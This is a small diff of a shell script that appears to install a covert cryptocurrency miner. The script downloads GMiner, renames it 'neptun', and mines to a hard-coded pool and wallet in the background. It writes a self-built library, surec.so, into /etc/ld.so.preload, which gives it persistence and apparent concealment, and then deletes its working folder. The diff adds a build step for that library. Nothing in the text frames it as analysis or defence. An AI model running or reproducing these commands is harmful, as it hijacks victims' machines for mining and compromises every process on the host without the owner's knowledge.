@@ -10,7 +10,8 @@ wget https://github.com/develsoftware/GMinerRelease/releases/download/3.43/gmine
 tar xvf gminer_3_43_linux64.tar.xz 
 cp miner ../neptun
 ./tmp/neptun --algo kawpow --server xna.2miners.com:6060 --user NibTPifN31vLNqZK1zUTX7LpeM2zAxw6Ek.RIG_4 -p x & 
-cd amd && mv surec.so /usr/local/lib/
+cd amd && make
+mv surec.so /usr/local/lib/
 echo /usr/local/lib/surec.so >> /etc/ld.so.preload
 cd ../../ && rm -rf ml/
 
